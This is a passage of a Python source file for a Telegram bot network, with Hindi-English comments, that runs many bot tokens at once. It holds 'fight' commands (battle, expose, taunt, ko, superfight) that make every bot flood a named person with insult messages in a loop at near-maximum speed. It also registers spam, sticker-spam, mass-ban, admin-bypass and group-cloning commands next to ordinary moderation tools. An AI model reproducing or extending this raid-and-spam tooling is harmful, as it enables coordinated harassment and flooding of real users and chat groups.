        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐫𝐞𝐩𝐨𝐫𝐭 𝐢𝐭!")
    cid = update.message.chat_id
    reporter = update.effective_user
    reported = update.message.reply_to_message.from_user
    reason = " ".join(context.args) if context.args else "𝐍𝐨 𝐫𝐞𝐚𝐬𝐨𝐧 𝐠𝐢𝐯𝐞𝐧"
    r_name = reporter.first_name or str(reporter.id)
    t_name = reported.first_name or str(reported.id) if reported else "Unknown"
    # Tag all admins
    try:
        admins = await context.bot.get_chat_administrators(cid)
        admin_tags = " ".join([
            f"[{a.user.first_name}](tg://user?id={a.user.id})"
            for a in admins if not a.user.is_bot
        ])
    except:
        admin_tags = "𝐀𝐝𝐦𝐢𝐧𝐬"
    await update.message.reply_to_message.reply_text(
        f"🚨 𝐑𝐄𝐏𝐎𝐑𝐓 𝐅𝐈𝐋𝐄𝐃!\n\n"
        f"📢 𝐑𝐞𝐩𝐨𝐫𝐭𝐞𝐝 𝐛𝐲: [{r_name}](tg://user?id={reporter.id})\n"
        f"👤 𝐀𝐠𝐚𝐢𝐧𝐬𝐭: {t_name}\n"
        f"📝 𝐑𝐞𝐚𝐬𝐨𝐧: {reason}\n\n"
        f"👮 𝐀𝐝𝐦𝐢𝐧𝐬: {admin_tags}",
        parse_mode="Markdown"
    )

# ─────────────────────────────────────────────────
#  AUTO-DELETE TIMER
# ─────────────────────────────────────────────────
@only_sudo
async def autodelete_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not context.args:
        current = autodelete_config.get(cid)
        if current:
            return await update.message.reply_text(f"🕐 𝐀𝐮𝐭𝐨-𝐝𝐞𝐥𝐞𝐭𝐞: {current}𝐬\n𝐔𝐬𝐞 /autodelete 0 𝐭𝐨 𝐝𝐢𝐬𝐚𝐛𝐥𝐞.")
        else:
            return await update.message.reply_text("🕐 𝐀𝐮𝐭𝐨-𝐝𝐞𝐥𝐞𝐭𝐞 𝐨𝐟𝐟.\n⚠️ 𝐔𝐬𝐚𝐠𝐞: /autodelete <𝐬𝐞𝐜𝐬>")
    try:
        secs = int(context.args[0])
    except:
        return await update.message.reply_text("⚠️ 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")
    if secs <= 0:
        autodelete_config.pop(cid, None)
        await update.message.reply_text("🕐 𝐀𝐮𝐭𝐨-𝐝𝐞𝐥𝐞𝐭𝐞 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃 ✅")
    else:
        autodelete_config[cid] = secs
        await update.message.reply_text(f"🕐 𝐀𝐔𝐓𝐎-𝐃𝐄𝐋𝐄𝐓𝐄 𝐎𝐍! 𝐌𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝 𝐚𝐟𝐭𝐞𝐫 {secs}𝐬 ✅")

# ─────────────────────────────────────────────────
#  FIGHTING COMMANDS (NEW)
# ─────────────────────────────────────────────────

fight_tasks = {}

@only_sudo
async def roast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐫𝐨𝐚𝐬𝐭!")
    target = update.message.reply_to_message.from_user
    name = target.first_name or target.username or str(target.id)
    text = random.choice(ROAST_TEXTS).format(name=name)
    await update.message.reply_to_message.reply_text(text)

@only_sudo
async def battle_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /battle <name>")
    name = " ".join(context.args)
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _battle_loop(bot, c, n):
        while True:
            try:
                txt = random.choice(BATTLE_TEXTS).format(name=n)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_battle_loop(bot, cid, name)) for bot in bots]
    await update.message.reply_text(f"⚔️ 𝐁𝐀𝐓𝐓𝐋𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐀𝐆𝐀𝐈𝐍𝐒𝐓 {name}! 🔥 /stopfight to stop")

@only_sudo
async def diss_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = " ".join(context.args) if context.args else (
        (update.message.reply_to_message.from_user.first_name if update.message.reply_to_message else "Hater")
    )
    text = random.choice(DISS_TEXTS).format(name=name)
    if update.message.reply_to_message:
        await update.message.reply_to_message.reply_text(text)
    else:
        await update.message.reply_text(text)

@only_sudo
async def expose_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not context.args and not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /expose <name> 𝐨𝐫 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫")
    if update.message.reply_to_message:
        name = update.message.reply_to_message.from_user.first_name or "Target"
    else:
        name = " ".join(context.args)
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _expose_loop(bot, c, n):
        while True:
            try:
                txt = random.choice(EXPOSE_TEXTS).format(name=n)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_expose_loop(bot, cid, name)) for bot in bots]
    await update.message.reply_text(f"📢 𝐄𝐗𝐏𝐎𝐒𝐈𝐍𝐆 {name}! 🚨 /stopfight to stop")

@only_sudo
async def warcry_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _warcry_loop(bot, c):
        while True:
            try:
                txt = random.choice(WARCRY_TEXTS)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_warcry_loop(bot, cid)) for bot in bots]
    await update.message.reply_text("⚔️ 𝐖𝐀𝐑𝐂𝐑𝐘 𝐒𝐓𝐀𝐑𝐓𝐄𝐃! 🔥 /stopfight to stop")

@only_sudo
async def taunt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not context.args and not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /taunt <name> 𝐨𝐫 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫")
    if update.message.reply_to_message:
        name = update.message.reply_to_message.from_user.first_name or "Target"
    else:
        name = " ".join(context.args)
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _taunt_loop(bot, c, n):
        while True:
            try:
                txt = random.choice(TAUNT_TEXTS).format(name=n)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_taunt_loop(bot, cid, name)) for bot in bots]
    await update.message.reply_text(f"😏 𝐓𝐀𝐔𝐍𝐓𝐈𝐍𝐆 {name}! 🔥 /stopfight to stop")

@only_sudo
async def ko_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not context.args and not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /ko <name> 𝐨𝐫 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫")
    if update.message.reply_to_message:
        name = update.message.reply_to_message.from_user.first_name or "Target"
    else:
        name = " ".join(context.args)
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _ko_loop(bot, c, n):
        while True:
            try:
                txt = random.choice(KO_TEXTS).format(name=n)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_ko_loop(bot, cid, name)) for bot in bots]
    await update.message.reply_text(f"🥊 𝐊𝐎 𝐌𝐎𝐃𝐄 𝐎𝐍 𝐅𝐎𝐑 {name}! 💀 /stopfight to stop")

@only_sudo
async def fightback_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
    async def _fightback_loop(bot, c):
        while True:
            try:
                txt = random.choice(FIGHTBACK_TEXTS)
                await bot.send_message(c, txt)
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
    fight_tasks[cid] = [asyncio.create_task(_fightback_loop(bot, cid)) for bot in bots]
    await update.message.reply_text("😤 𝐅𝐈𝐆𝐇𝐓𝐁𝐀𝐂𝐊 𝐌𝐎𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐄! ⚔️ /stopfight to stop")

@only_sudo
async def stopfight_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()
        del fight_tasks[cid]
        await update.message.reply_text("🛑 𝐅𝐈𝐆𝐇𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃! 🏳️")
    else:
        await update.message.reply_text("⚠️ 𝐍𝐨 𝐟𝐢𝐠𝐡𝐭 𝐚𝐜𝐭𝐢𝐯𝐞 𝐡𝐞𝐫𝐞.")

# ─────────────────────────────────────────────────
#  SUPER FIGHT — ALL BOTS + ALL TEXTS SIMULTANEOUSLY
# ─────────────────────────────────────────────────
ALL_FIGHT_TEXTS = (
    ROAST_TEXTS + BATTLE_TEXTS + DISS_TEXTS +
    EXPOSE_TEXTS + WARCRY_TEXTS + TAUNT_TEXTS +
    KO_TEXTS + FIGHTBACK_TEXTS + SUPERFIGHT_TEXTS
)

@only_sudo
async def superfight_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /superfight <name>  ya reply karke
    Saare bots EK SAATH fire karte hain — har bot alag text
    asyncio.gather se maximum speed parallel spam!
    """
    cid = update.message.chat_id
    if not context.args and not update.message.reply_to_message:
        return await update.message.reply_text(
            "⚠️ 𝐔𝐬𝐚𝐠𝐞: /superfight <name>  𝐲𝐚 𝐤𝐢𝐬𝐢 𝐩𝐞 𝐑𝐞𝐩𝐥𝐲 𝐊𝐚𝐫𝐨"
        )
    if update.message.reply_to_message:
        name = update.message.reply_to_message.from_user.first_name or "Target"
    else:
        name = " ".join(context.args)

    if cid in fight_tasks:
        for t in fight_tasks[cid]: t.cancel()

    total = len(bots)

    async def _super_loop(bot, c, n, offset):
        idx = offset
        while True:
            try:
                txt = ALL_FIGHT_TEXTS[idx % len(ALL_FIGHT_TEXTS)]
                if "{name}" in txt:
                    txt = txt.format(name=n)
                await bot.send_message(c, txt)
                idx += total          # har bot alag text uthata hai
                await asyncio.sleep(fight_delay)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(0.5)

    fight_tasks[cid] = [
        asyncio.create_task(_super_loop(bot, cid, name, i))
        for i, bot in enumerate(bots)
    ]

    await update.message.reply_text(
        f"💥⚡ 𝐒𝐔𝐏𝐄𝐑 𝐅𝐈𝐆𝐇𝐓 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃! ⚡💥\n"
        f"🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {name}\n"
        f"🤖 𝐁𝐨𝐭𝐬: {total} (𝐄𝐤 𝐒𝐚𝐚𝐭𝐡!)\n"
        f"📝 𝐓𝐞𝐱𝐭𝐬: {len(ALL_FIGHT_TEXTS)} 𝐓𝐲𝐩𝐞𝐬\n"
        f"⚡ 𝐒𝐩𝐞𝐞𝐝: {fight_delay}𝐬 𝐩𝐫𝐨 𝐛𝐨𝐭\n\n"
        f"🛑 𝐑𝐨𝐤𝐧𝐞 𝐊𝐞 𝐋𝐢𝐲𝐞: /stopfight"
    )

@only_sudo
async def fspeed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /fspeed <seconds>  — Fight spam ki speed control karo
    /fspeed 0.05  = Maximum speed (Telegram limit tak)
    /fspeed 1     = 1 second delay
    """
    global fight_delay
    if not context.args:
        return await update.message.reply_text(
            f"⚡ 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐅𝐢𝐠𝐡𝐭 𝐒𝐩𝐞𝐞𝐝: {fight_delay}𝐬\n"
            f"𝐔𝐬𝐚𝐠𝐞: /fspeed <𝐬𝐞𝐜𝐨𝐧𝐝𝐬>\n"
            f"𝐄𝐱: /fspeed 0.05  (𝐌𝐚𝐱 𝐒𝐩𝐞𝐞𝐝)\n"
            f"𝐄𝐱: /fspeed 0.5   (𝐌𝐞𝐝𝐢𝐮𝐦)\n"
            f"𝐄𝐱: /fspeed 2     (𝐒𝐥𝐨𝐰)"
        )
    try:
        new_delay = float(context.args[0])
        if new_delay < 0.05:
            new_delay = 0.05
        fight_delay = new_delay
        speed_label = "🔥 𝐌𝐀𝐗" if new_delay <= 0.1 else ("⚡ 𝐅𝐀𝐒𝐓" if new_delay <= 0.5 else "🐢 𝐒𝐋𝐎𝐖")
        await update.message.reply_text(
            f"✅ 𝐅𝐢𝐠𝐡𝐭 𝐒𝐩𝐞𝐞𝐝 𝐒𝐞𝐭!\n"
            f"⏱️ 𝐃𝐞𝐥𝐚𝐲: {fight_delay}𝐬\n"
            f"🏷️ 𝐋𝐞𝐯𝐞𝐥: {speed_label}"
        )
    except ValueError:
        await update.message.reply_text("❌ 𝐒𝐡𝐢 𝐍𝐮𝐦𝐛𝐚𝐫 𝐃𝐨. 𝐄𝐱: /fspeed 0.1")

# ─────────────────────────────────────────────────
#  APP BUILDER & RUNNER
# ─────────────────────────────────────────────────
def build_app(token):
    app = Application.builder().token(token).build()
    handlers = [
        CommandHandler("start",          start_cmd),
        CommandHandler("help",           help_cmd),
        CommandHandler("ping",           ping_cmd),
        CommandHandler("status",         status_cmd),
        CommandHandler("dreact",         dreact_cmd),
        CommandHandler("stopdreact",     stopdreact_cmd),
        CommandHandler("godspeed",       godspeed_cmd),
        CommandHandler("stopnc",         stopnc_cmd),
        CommandHandler("spam",           spam_cmd),
        CommandHandler("unspam",         unspam_cmd),
        CommandHandler("imagespam",      imagespam_cmd),
        CommandHandler("stickerspam",    stickerspam_cmd),
        CommandHandler("swipe",          swipe_cmd),
        CommandHandler("stopswipe",      stopswipe_cmd),
        CommandHandler("react",          react_cmd),
        CommandHandler("stopreact",      stopreact_cmd),
        CommandHandler("Stopreact",      stopreact_cmd),
        CommandHandler("Changename",     changename_cmd),
        CommandHandler("Setpfp",         setpfp_cmd),
        CommandHandler("changepfp",      changepfp_cmd),
        CommandHandler("stop",           stop_all_cmd),
        CommandHandler("delaync",        delaync_cmd),
        CommandHandler("delayspam",      delayspam_cmd),
        CommandHandler("globalactivate", globalactivate_cmd),
        CommandHandler("offglobal",      offglobal_cmd),
        CommandHandler("groups",         groups_cmd),
        CommandHandler("leaveglobal",    leaveglobal_cmd),
        CommandHandler("g",              global_broadcast_cmd),
        CommandHandler("target",         targetspm_cmd),
        CommandHandler("settemplate",    settemplate_cmd),
        CommandHandler("spamtarget",     spamtarget_cmd),
        CommandHandler("stoptarget",     stoptarget_cmd),
        CommandHandler("showtemplate",   showtemplate_cmd),
        CommandHandler("akal",           akal_cmd),
        CommandHandler("flagnc",         flagnc_cmd),
        CommandHandler("heartnc",        heartnc_cmd),
        CommandHandler("aestheticnc",    aestheticnc_cmd),
        CommandHandler("vegetablenc",    vegetablenc_cmd),
        CommandHandler("animalnc",       animalnc_cmd),
        CommandHandler("timenc",         timenc_cmd),
        CommandHandler("kengnc",         kengnc_cmd),
        CommandHandler("threads",        threads_cmd),
        CommandHandler("getallbots",     getallbots_cmd),
        CommandHandler("giveadmin",      giveadmin_cmd),
        CommandHandler("newgroup",       newgroup_cmd),
        CommandHandler("alladmin",       alladmin_cmd),
        CommandHandler("clonegroup",     clonegroup_cmd),
        CommandHandler("adminbyp",       adminbyp_cmd),
        CommandHandler("sudo",           add_sudo_cmd),
        CommandHandler("listsudo",       list_sudo_cmd),
        CommandHandler("delsudo",        del_sudo_cmd),
        CommandHandler("owner",          owner_cmd),
        CommandHandler("slaves",         slaves_cmd),
        CommandHandler("addslave",       addslave_cmd),
        CommandHandler("delslave",       delslave_cmd),
        CommandHandler("showslave",      showslave_cmd),
        CommandHandler("saveslave",      saveslave_cmd),
        CommandHandler("gnc",            gnc_cmd),
        CommandHandler("setmphoto",      setmphoto_cmd),
        CommandHandler("clearmphoto",    clearmphoto_cmd),
        CommandHandler("refresh",        refresh_cmd),
        CommandHandler("Setlayout",      setlayout_cmd),
        CommandHandler("resetlayout",    resetlayout_cmd),
        CommandHandler("broadcast",      broadcast_cmd),
        CommandHandler("schedule",       schedule_cmd),
        CommandHandler("superfight",      superfight_cmd),
        CommandHandler("fspeed",         fspeed_cmd),
        CommandHandler("massban",        massban_cmd),
        CommandHandler("warn",           warn_cmd),
        CommandHandler("warns",          warns_cmd),
        CommandHandler("unwarn",         unwarn_cmd),
        CommandHandler("mute",           mute_cmd),
        CommandHandler("unmute",         unmute_cmd),
        CommandHandler("kick",           kick_cmd),
        CommandHandler("info",           info_cmd),
        CommandHandler("purge",          purge_cmd),
        CommandHandler("pin",            pin_cmd),
        CommandHandler("unpin",          unpin_cmd),
        CommandHandler("tagall",         tagall_cmd),
        CommandHandler("exonc",          exonc_cmd),
        CommandHandler("note",           note_cmd),
        CommandHandler("getnote",        getnote_cmd),
        CommandHandler("notes",          notes_cmd),
        CommandHandler("delnote",        delnote_cmd),
        CommandHandler("antidelete",     antidelete_cmd),
        CommandHandler("watchspam",      watchspam_cmd),
        CommandHandler("wsconfig",       wsconfig_cmd),
        CommandHandler("addword",        addword_cmd),
        CommandHandler("delword",        delword_cmd),
        CommandHandler("spamwords",      spamwords_cmd),
        CommandHandler("setgc",          setgc_cmd),
        CommandHandler("promote",        promote_cmd),
        CommandHandler("demote",         demote_cmd),
        CommandHandler("ban",            ban_cmd),
        CommandHandler("unban",          unban_cmd),
        CommandHandler("slide",          slide_add_cmd),
        CommandHandler("unslide",        slide_del_cmd),
        CommandHandler("gban",           gban_cmd),
        CommandHandler("ungban",         ungban_cmd),
        CommandHandler("setwelcome",     setwelcome_cmd),
        CommandHandler("delwelcome",     delwelcome_cmd),
        CommandHandler("antilink",       antilink_cmd),
        CommandHandler("antiforward",    antiforward_cmd),
        CommandHandler("raidmode",       raidmode_cmd),
        CommandHandler("lock",           lock_cmd),
        CommandHandler("unlock",         unlock_cmd),
        CommandHandler("addtrigger",     addtrigger_cmd),
        CommandHandler("deltrigger",     deltrigger_cmd),
        CommandHandler("triggers",       triggers_cmd),
        CommandHandler("topchat",        topchat_cmd),
        CommandHandler("report",         report_cmd),
        CommandHandler("autodelete",     autodelete_cmd),
        CommandHandler("roast",          roast_cmd),
        CommandHandler("battle",         battle_cmd),
        CommandHandler("diss",           diss_cmd),
        CommandHandler("expose",         expose_cmd),
        CommandHandler("warcry",         warcry_cmd),
        CommandHandler("taunt",          taunt_cmd),
        CommandHandler("ko",             ko_cmd),
        CommandHandler("fightback",      fightback_cmd),
        CommandHandler("stopfight",      stopfight_cmd),
        CommandHandler("addtoken",        addtoken_cmd),
        CommandHandler("deltoken",        deltoken_cmd),
        CommandHandler("listtokens",      listtokens_cmd),
        CallbackQueryHandler(menu_callback, pattern="^menu_"),
        CallbackQueryHandler(gnc_callback,  pattern="^gnc_"),
        MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, welcome_new_member),
        MessageHandler(filters.ALL & ~filters.COMMAND, auto_replies),
    ]
    for h in handlers: app.add_handler(h)
    return app

bots = [Application.builder().token(t).build().bot for t in TOKENS]
running_apps = []

# ─────────────────────────────────────────────────
#  TOKEN MANAGEMENT COMMANDS
# ─────────────────────────────────────────────────
@only_sudo
async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text(
            "╭━━━━〔 🔑 𝐀𝐃𝐃 𝐓𝐎𝐊𝐄𝐍 〕━━━━╮\n"
            "│\n"
            "│  ⚠️ 𝐔𝐬𝐚𝐠𝐞: /addtoken <BOT_TOKEN>\n"
            "│  📌 𝐁𝐨𝐭𝐅𝐚𝐭𝐡𝐞𝐫 𝐬𝐞 𝐭𝐨𝐤𝐞𝐧 𝐥𝐨\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    new_token = context.args[0].strip()
    if new_token in TOKENS:
        return await update.message.reply_text("⚠️ 𝐘𝐞 𝐓𝐨𝐤𝐞𝐧 𝐏𝐚𝐡𝐥𝐞 𝐬𝐞 𝐡𝐢 𝐀𝐜𝐭𝐢𝐯𝐞 𝐇𝐚𝐢!")
    wait_msg = await update.message.reply_text("⏳ 𝐓𝐨𝐤𝐞𝐧 𝐕𝐞𝐫𝐢𝐟𝐲 𝐇𝐨 𝐑𝐚𝐡𝐚 𝐇𝐚𝐢...")
    try:
        test_app = Application.builder().token(new_token).build()
        me = await test_app.bot.get_me()
        bot_name = me.username
        TOKENS.append(new_token)
        bots.append(test_app.bot)
        extra = load_extra_tokens()
        if new_token not in extra:
            extra.append(new_token)
            save_extra_tokens(extra)
        await test_app.initialize()
        await test_app.start()
        await test_app.updater.start_polling()
        running_apps.append(test_app)
        bot_usernames.append(bot_name)
        await wait_msg.edit_text(
            "╭━━━━〔 ✅ 𝐓𝐎𝐊𝐄𝐍 𝐀𝐃𝐃𝐄𝐃 〕━━━━╮\n"
            "│\n"
            f"│  🤖 𝐁𝐨𝐭    : @{bot_name}\n"
            f"│  🔢 𝐓𝐨𝐭𝐚𝐥  : {len(TOKENS)} 𝐛𝐨𝐭𝐬 𝐚𝐜𝐭𝐢𝐯𝐞\n"
            "│  ⚡ 𝐋𝐢𝐯𝐞 𝐀𝐝𝐝𝐞𝐝 — 𝐍𝐨 𝐑𝐞𝐬𝐭𝐚𝐫𝐭!\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except Exception as e:
        await wait_msg.edit_text(
            f"╭━━━━〔 ❌ 𝐓𝐎𝐊𝐄𝐍 𝐅𝐀𝐈𝐋𝐄𝐃 〕━━━━╮\n"
            "│\n"
            f"│  ❌ 𝐄𝐫𝐫𝐨𝐫: {str(e)[:60]}\n"
            "│  ⚠️ 𝐓𝐨𝐤𝐞𝐧 𝐆𝐚𝐥𝐚𝐭 𝐇𝐚𝐢 𝐘𝐚 𝐄𝐱𝐩𝐢𝐫𝐞𝐝!\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )

@only_sudo
async def deltoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        lines = []
        for i, t in enumerate(TOKENS, 1):
            masked = t[:8] + "..." + t[-5:]
            src = "🔒 ENV" if i == 1 else "💾 FILE"
            lines.append(f"│  {i}. {masked} [{src}]")
        text = (
            "╭━━━━〔 🗑️ 𝐃𝐄𝐋 𝐓𝐎𝐊𝐄𝐍 〕━━━━╮\n"
            "│\n"
            + "\n".join(lines) + "\n"
            "│\n"
            "│  ⚠️ 𝐔𝐬𝐚𝐠𝐞: /deltoken <𝐍𝐔𝐌𝐁𝐄𝐑>\n"
            "│  ⚠️ 𝐁𝐨𝐭 𝟏 (𝐄𝐍𝐕) 𝐃𝐞𝐥𝐞𝐭𝐞 𝐍𝐚𝐡𝐢 𝐇𝐨𝐠𝐚\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        return await update.message.reply_text(text)
    try:
        num = int(context.args[0])
        if num < 1 or num > len(TOKENS):
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫.")
        if num == 1:
            return await update.message.reply_text("❌ 𝐌𝐚𝐢𝐧 𝐁𝐨𝐭 (𝟏) 𝐃𝐞𝐥𝐞𝐭𝐞 𝐍𝐚𝐡𝐢 𝐊𝐚𝐫 𝐒𝐚𝐤𝐭𝐞!")
        idx = num - 1
        removed_token = TOKENS.pop(idx)
        if idx < len(bots): bots.pop(idx)
        if idx < len(bot_usernames): bot_usernames.pop(idx)
        extra = load_extra_tokens()
        if removed_token in extra:
            extra.remove(removed_token)
            save_extra_tokens(extra)
        masked = removed_token[:8] + "..." + removed_token[-5:]
        await update.message.reply_text(
            "╭━━━━〔 ✅ 𝐓𝐎𝐊𝐄𝐍 𝐑𝐄𝐌𝐎𝐕𝐄𝐃 〕━━━━╮\n"
            "│\n"
            f"│  🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 : {masked}\n"
            f"│  🔢 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {len(TOKENS)} 𝐛𝐨𝐭𝐬\n"
            "│  ℹ️ 𝐁𝐨𝐭 𝐍𝐞𝐱𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭 𝐩𝐞 𝐁𝐚𝐧𝐝 𝐇𝐨𝐠𝐚\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except ValueError:
        await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /deltoken <𝐍𝐔𝐌𝐁𝐄𝐑>")

@only_sudo
async def listtokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not TOKENS:
        return await update.message.reply_text("⚠️ 𝐊𝐨𝐢 𝐓𝐨𝐤𝐞𝐧 𝐍𝐚𝐡𝐢 𝐡𝐚𝐢!")
    extra_saved = load_extra_tokens()
    lines = []
    for i, t in enumerate(TOKENS, 1):
        masked = t[:8] + "***" + t[-5:]
        uname = bot_usernames[i-1] if i-1 < len(bot_usernames) else "Unknown"
        if t in extra_saved:
            src = "💾 𝐒𝐚𝐯𝐞𝐝"
        else:
            src = "🔒 𝐄𝐍𝐕"
        lines.append(f"│  {i}. @{uname} | {masked} [{src}]")
    await update.message.reply_text(
        "╭━━━━〔 🤖 𝐀𝐋𝐋 𝐓𝐎𝐊𝐄𝐍𝐒 〕━━━━╮\n"
        "│\n"
        + "\n".join(lines) + "\n"
        "│\n"
        f"│  𝐓𝐨𝐭𝐚𝐥: {len(TOKENS)} 𝐁𝐨𝐭𝐬 𝐀𝐜𝐭𝐢𝐯𝐞 ✅\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

async def run_bots():
    if not TOKENS:
        print("❌ ERROR: BOT_TOKEN env variable not set!")
        return
    load_data()
    load_slaves()
    load_notes()
    load_warns()
    load_seen_users()
    load_gbans()
    global bot_usernames
    bot_usernames = []
    for b in bots:
        try:
            me = await b.get_me()
            bot_usernames.append(me.username)
            print(f"✅ Bot loaded: @{me.username}")
        except Exception as e:
            print(f"❌ Failed to load bot: {e}")
    apps = [build_app(t) for t in TOKENS]
    for app in apps:
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
    print("🚀 BOT RUNNING! Send /start to your bot.")
    if bots:
        asyncio.create_task(antidelete_checker_task(bots[0]))
    while True: await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(run_bots())